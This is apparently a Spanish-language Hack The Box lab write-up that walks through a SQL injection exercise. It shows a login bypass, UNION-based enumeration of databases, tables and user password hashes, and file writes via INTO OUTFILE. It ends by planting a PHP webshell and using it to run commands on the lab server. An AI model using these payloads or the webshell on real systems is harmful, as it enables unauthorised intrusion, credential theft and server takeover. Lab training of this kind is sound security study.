--- 
title: "Laboratorio de Fundamentos de SQLi"  
date: 2025-08-22
tags: [hackthebox, SQLi, web]
categories: ["SQLi", "Hack The Box"]
summary: "En este laboratorio, explotamos un panel de autenticación vulnerable para obtener acceso, enumeramos bases de datos y privilegios del usuario root, finalmente subimos una webshell al servidor, consiguiendo (RCE) ."
draft: false 

---
![](../../../../../images/Miniaturas/sqli.png)
#### Enunciado
La empresa `Inlanefreight`le ha contratado para realizar una evaluación de su aplicación web en uno de sus sitios web públicos. Tras una reciente vulneración de seguridad de uno de sus principales competidores, les preocupan especialmente las vulnerabilidades de inyección SQL y el daño que el descubrimiento y la explotación exitosa de este ataque podrían causar a su imagen pública y sus resultados.

Proporcionaron una dirección IP de destino y no proporcionaron más información sobre su sitio web. Realice una evaluación completa de la aplicación web con un enfoque de "caja gris", verificando la existencia de vulnerabilidades de inyección SQL.

Identifique las vulnerabilidades y envíe una alerta final utilizando las habilidades que vimos para completar este módulo. ¡No olvide pensar de forma innovadora!

**Evalúe la aplicación web y utilice diversas técnicas para obtener la ejecución remota de código y encontrar una bandera en el directorio raíz del sistema de archivos. 
Envíe el contenido de la bandera como respuesta.**

Al dirigirnos a la IP que nos dan vemos que tenemos un panel de autenticación, el cual debemos pasar, y empezamos a enumerar con las querys típicas.
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-1.png)
Vemos que tenemos acceso con: 
```sql
' OR 1-- -
```
Redirigiendonos para dashboard.php.

![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-2.png)

Vemos la cantidad de columnas de la tabla 
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-3.png)
```sql
' order by 6;-- -;
```
Vemos que falla con 6 por lo que tiene 5 columnas. 

Hacemos la query para posicionar los números.
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-4.png)
Vemos las bases de datos:
```sql
' union select 1,schema_name,3,4,5 from information_schema.schemata-- -
```

![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-5.png)
Vemos las tablas:
```sql
' union select 1, table_name,3,4,5 from information_schema.tables where table_schema='ilfreight' -- -
```
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-6.png)
Vemos las columnas: 
```sql
' union select 1, column_name,3,4,5 from information_schema.columns where table_schema='ilfreight' and table_name='users'-- -
```
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-7.png)
Vemos los datos:
```sql
us' union select 1, username,password,4,5 from ilfreight.users-- -
```
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-8.png)
Vemos el hash del ussuario adam.
`adam:1be9f5d3a82847b8acca40544f953515`

Vemos que usuario tenemos en la aplicación web:
```sql
us' union select 1, user(),3,4,5-- -
```
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-9.png)
Vemos que tenemos el usuario root, vemos si tenemos privilegios como superadministrador.
```sql
' UNION SELECT 1,super_priv,3,4,5 FROM mysql.user-- -
```

![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-10.png)
Vemos mas en detalle los permisos que tenemos como usuario root sobre el servidor:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-11.png)
Y vemos que podemos leer, modificar, incluso subir archivos al servidor.
 Vemos que tenemos el usuario con permisos FILE, comprobamos si la variable `secure_file_priv` está deshabilitada.
```sql
' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-12.png)
Que es el caso.
Cuando intentamos subir archivos en `/var/www/html/` no nos permite porque no tenemos permisos sin embargo en `/var/www/html/dashboard/` si. Con lo cual hacemos una prueba
```sql
' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt'-- -
```
Visitamos la ruta 
(http://IP:Puerto/dashboard/proof.txt)
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-14.png)

Subimos nuestra webshell:
```sql
' union select 1,'<?php system($_REQUEST[cmd]); ?>', 3, 4, 5 into outfile '/var/www/html/dashboard/shell.php'-- -
```
Visitamos:
(http://IP:Puerto/dashboard/shell.php?cmd=whoami)
![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-15.png)
Al visitar la ruta de nuestra webshell vemos que tenemos ejecución remota de comandos en el servidor
Vemos los archivos en la raíz.
(http://IP:Puerto/dashboard/shell.php?cmd=ls /)

![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-16.png)
Leemos la flag
(http://IP:Puerto/dashboard/shell.php?cmd=cat /flag_cae1dadcd174.txt)

![](../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-17.png)

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.